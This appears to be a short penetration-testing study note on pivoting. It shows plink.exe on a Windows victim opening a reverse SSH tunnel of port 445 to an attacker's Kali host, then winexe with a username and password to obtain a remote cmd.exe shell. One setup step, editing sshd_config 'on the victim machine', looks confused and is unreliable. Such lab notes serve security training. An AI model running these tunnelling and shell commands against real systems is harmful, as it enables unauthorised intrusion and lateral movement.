Sometimes it's easier to run exploit code on Kali, but the vulnerable program is running on an internal port
- can be forwarded with plink.exe


**Setup**
1. On victim machine, ensure ssh PermitRootLogin is set to "yes" in `/etc/ssh/sshd_config`
![](assets/Pasted%20image%2020260607153558.png)


2. Run plink.exe on victim
```
.\plink.exe <user>@<attacker_IP> -R 445:127.0.0.1:445
```
- `-R` forwards a remote port to a local port
![](assets/Pasted%20image%2020260607153334.png)
- Port 445 on Kali is now being forwarded to 445 on the victim machine through ssh

3. try winexe again to get a shell through 445 firewall
```
winexe -U 'admin%password123' \\<victim_IP> cmd.exe
```
![](assets/Pasted%20image%2020260607153447.png)

